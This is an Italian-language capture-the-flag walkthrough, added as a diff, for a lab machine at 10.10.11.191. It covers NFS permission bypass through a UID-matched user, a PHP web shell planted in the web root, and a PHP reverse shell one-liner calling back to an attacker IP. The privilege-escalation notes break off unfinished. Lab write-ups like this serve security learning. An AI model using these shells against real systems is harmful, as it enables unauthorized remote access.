@@ -1,0 +1,36 @@
+Ho porta RPC ma non accetta connessione, guardo il sito
+Nulla di che, neanche gobuster trova nulla di utile.
+Vedo che c'è il servizio nfs
+Provo con quello
+
+Prendo le directories ma in html ho accesso denied
+con ls -la vedo che la directory è di un user 2017
+Posso aggirare il problema
+
+Creo un user che abbia i permessi
+useradd santa --uid 2017
+Ora la folder è di santa se faccio ls -la
+sudo sa santa
+Posso entrare ora
+
+Sono dentro, ci sono tutti i file php del sito.
+Posso quindi provare a creare un semplice backdoor
+<?php echo system($_GET["cmd"]) ?>
+
+Andando nell'url e inserendo 
+http://10.10.11.191/back.php?cmd=id
+
+Funziona, posso inserire comandi
+Creo una reverse shell di tipo php
+php -r '$sock=fsockopen("10.10.14.12",555);shell_exec("sh <&3 >&3 2>&3");'
+La encodo URL e la inserisco nel browser dopo cmd
+
+Sono dentro come alex
+user flag presa
+
+PRIVESC
+Ricordo che ho i file xAuthority nel sistema, vuol dire che sono vulnerabili a x11
+https://book.hacktricks.xyz/network-services-pentesting/6000-pentesting-x11
+
+TBC
+
